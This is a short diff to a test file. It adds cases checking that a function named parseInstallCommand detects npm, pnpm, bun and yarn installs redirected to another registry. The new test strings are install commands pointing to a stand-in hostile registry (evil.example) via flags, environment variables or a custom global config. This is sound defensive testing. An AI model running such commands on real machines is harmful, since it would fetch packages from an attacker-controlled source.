@@ -253,6 +253,13 @@ test("an install from another registry (flag, config file or env prefix) is skip
     "env NPM_CONFIG_REGISTRY=https://evil.example/ pnpm add foo@1.0.0",
     "export NPM_CONFIG_REGISTRY=https://evil.example/ && npm i foo@1.0.0",
     "pnpm add foo@1.0.0 --registry https://evil.example/",
+    "pnpm add foo@1.0.0 --config.registry=https://evil.example/",
+    "npm i foo@1.0.0 --globalconfig=./x.npmrc",
+    "npm_config_globalconfig=./x.npmrc npm i foo@1.0.0",
+    "pnpm_config_registry=https://evil.example/ pnpm add foo@1.0.0",
+    "BUN_CONFIG_REGISTRY=https://evil.example/ bun add foo@1.0.0",
+    "YARN_REGISTRY=https://evil.example/ yarn add foo@1.0.0",
+    "YARN_NPM_REGISTRY_SERVER=https://evil.example/ yarn add foo@1.0.0",
   ];
   for (const cmd of cases) {
     const r = parseInstallCommand(cmd);
